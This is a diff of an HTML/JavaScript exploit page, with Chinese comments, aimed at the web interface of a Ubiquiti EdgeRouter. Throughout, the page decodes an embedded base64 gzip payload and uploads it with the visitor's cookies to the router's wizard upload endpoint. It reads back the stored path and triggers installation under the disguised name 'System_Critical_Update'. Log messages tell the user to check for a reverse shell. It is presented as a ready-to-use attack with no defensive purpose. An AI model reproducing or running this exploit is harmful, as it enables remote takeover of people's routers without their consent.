@@ -2,12 +2,13 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="referrer" content="no-referrer"> <title>Router RCE</title>
+    <meta name="referrer" content="no-referrer">
+    <title>Router RCE Final</title>
 </head>
 <body>
     <h1>Ubiquiti EdgeRouter RCE (Smart Mode)</h1>
-    <button onclick="runExploit()">⚡ Pwn Now ⚡</button>
-    <div id="log" style="white-space: pre-wrap; font-family: monospace; color: green;"></div>
+    <button onclick="runExploit()">⚡ ATTACK ⚡</button>
+    <div id="log" style="white-space: pre-wrap; font-family: monospace; color: green; background: #eee; padding: 10px;"></div>
 
     <script>
         var target = "https://192.168.1.1";
@@ -18,7 +19,7 @@
         }
 
         function runExploit() {
-            // 1. 准备 Payload
+            // 1. 构造 Payload
             var b64Data = "H4sICCx1MmkC/2V4cGxvaXQudGFyAO3VQU/CMBjG8Z75FDWeXft23ZolaDyIgYNICIlHUrclm7LNjIJE43eX6UGjAU/MAM/v0qVb0kvf/T3hicuRXfVTm6Q12wn5adMqpa++npt9kook4yvWgsXc2Xp9PDtOKuSFy4v0nEyoI9LahF7kBxR1GByB5/zF1slZvSh3d0Yz1KHWzUomkN/XD0SaUUDN5VM6CNbzr8gnxmWb8x/bWbXt//fX+z11eiLu81LMs46rFnHGhSuexOhu2LuaXo9vb6aD4aQ3HvYmnTgrqoQbYzZ/gmnaPx76j/6j/0fefy9zxezf+i/9X/1Xxkf/29DN6KJv48c04cvc8kHp0rpMXVes9zEd6D/6j/7D4VraWZ5YV9Xew7wqdzf/W/sv1c/+m1Ci/214fcMMAAAAAAAAAAAcsncEDx/KACgAAA==";
             var byteCharacters = atob(b64Data);
             var byteNumbers = new Array(byteCharacters.length);
@@ -27,32 +28,35 @@
             }
             var blob = new Blob([new Uint8Array(byteNumbers)], { type: "application/x-gzip" });
 
-            // 2. 发送 Step 1 (上传)
+            // 2. 上传并读取回显
             var formData = new FormData();
-            formData.append("qqfile", blob, "exploit.tar.gz"); // 文件名不重要了，反正它会改名
+            formData.append("qqfile", blob, "exploit.tar.gz");
 
             var xhr = new XMLHttpRequest();
             xhr.open("POST", target + "/api/wizard/upload.json", true);
-            xhr.withCredentials = true; // 必带 Cookie
+            xhr.withCredentials = true;
 
             log("[*] Step 1: Uploading payload...");
 
             xhr.onload = function () {
                 if (xhr.status === 200) {
                     try {
-                        // 关键点：因为关闭了 CORS，我们现在可以看到这个 JSON 了！
+                        log("[+] Upload Success! Response: " + xhr.responseText);
+                        // 解析真实的随机路径
                         var resp = JSON.parse(xhr.responseText);
-                        log("[+] Upload Success! Server response: " + xhr.responseText);
                         
-                        if (resp.path) {
-                            log("[!] Got random path: " + resp.path);
-                            // 拿到真实路径，发起第二步
-                            triggerInstall(resp.path);
+                        // 这里的字段名可能是 'path' 或者 'file'，根据回显自动判断
+                        // 之前你没看到回显，现在能看到了
+                        var realPath = resp.path || resp.file || resp.url;
+                        
+                        if (realPath) {
+                            log("[!] Target confirmed at: " + realPath);
+                            triggerInstall(realPath);
                         } else {
-                            log("[-] JSON parsed but no 'path' found. Response: " + xhr.responseText);
+                            log("[-] JSON parsed but no path found. Response structure unknown.");
                         }
                     } catch (e) {
-                        log("[-] Could not parse JSON. Is Chrome flag active? Error: " + e);
+                        log("[-] Error parsing JSON: " + e);
                     }
                 } else {
                     log("[-] Upload failed. Status: " + xhr.status);
@@ -61,21 +65,20 @@
             xhr.send(formData);
         }
 
-        function triggerInstall(realPath) {
-            log("[*] Step 2: Executing payload at " + realPath + " ...");
-            
+        function triggerInstall(path) {
+            log("[*] Step 2: Executing payload at " + path + " ...");
             var xhr2 = new XMLHttpRequest();
             xhr2.open("POST", target + "/api/wizard/create.json", true);
             xhr2.withCredentials = true;
-
-            var formData2 = new FormData();
-            formData2.append("name", "System_Critical_Update");
-            formData2.append("path", realPath); // 使用从 Step 1 拿到的真实路径
+            var fd = new FormData();
+            fd.append("name", "System_Critical_Update");
+            fd.append("path", path); // 使用刚才获取的真实路径
 
             xhr2.onload = function () {
-                log("[+] Exploit chain sent! Check your reverse shell.");
+                log("[+] Exploit triggered! Status: " + xhr2.status);
+                log("[+] Check your reverse shell/router file system now.");
             };
-            xhr2.send(formData2);
+            xhr2.send(fd);
         }
     </script>
 </body>
